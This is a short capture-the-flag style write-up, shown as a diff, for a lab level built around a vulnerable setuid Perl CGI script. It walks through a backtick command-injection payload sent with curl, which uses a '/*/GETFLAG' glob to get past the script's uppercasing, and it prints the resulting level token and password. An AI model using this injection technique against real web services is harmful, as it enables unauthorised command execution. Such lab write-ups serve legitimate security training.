@@ -1,0 +1,70 @@
+$ ls -l
+total 4
+-rwsr-sr-x+ 1 flag12 level12 464 Mar  5  2016 level12.pl
+
+$cat level12.pl
+
+#!/usr/bin/env perl
+# localhost:4646
+use CGI qw{param};
+print "Content-type: text/html\n\n";
+
+sub t {
+  $nn = $_[1];
+  $xx = $_[0];
+  $xx =~ tr/a-z/A-Z/;
+  $xx =~ s/\s.*//;
+  @output = `egrep "^$xx" /tmp/xd 2>&1`;
+  foreach $line (@output) {
+      ($f, $s) = split(/:/, $line);
+      if($s =~ $nn) {
+          return 1;
+      }
+  }
+  return 0;
+}
+
+sub n {
+  if($_[0] == 1) {
+      print("..");
+  } else {
+      print(".");
+  }
+}
+
+n(t(param("x"), param("y")));
+
+it run on 127.0.0.1:4646
+
+  $xx =~ tr/a-z/A-Z/;
+  this line will capitalize every char so we cant run cmd directly...
+
+  @output = `egrep "^$xx" /tmp/xd 2>&1`;
+  this line will execute our input with backquote ``
+
+  we need to put our getflag command in a file name in caps
+
+$ cat /tmp/GETFLAG
+#!/bin/sh
+getflag>/tmp/result
+
+and we will call the script with
+
+curl http://192.168.0.7:4646/
+
+and set the variable x
+$ curl http://192.168.0.7:4646/\?x\="\`/*/GETFLAG\`"
+
+we cant use path /tmp/GETFLAG because it will be capitalise to /TMP/GETFLAG 
+so we use /*/getflag
+
+
+$ curl http://192.168.0.7:4646/\?x\="\`/*/GETFLAG\`"
+..#
+
+$ cat /tmp/result
+Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
+
+su level13
+password : g1qKMiRpXf53AWhDaU7FEkczr
+
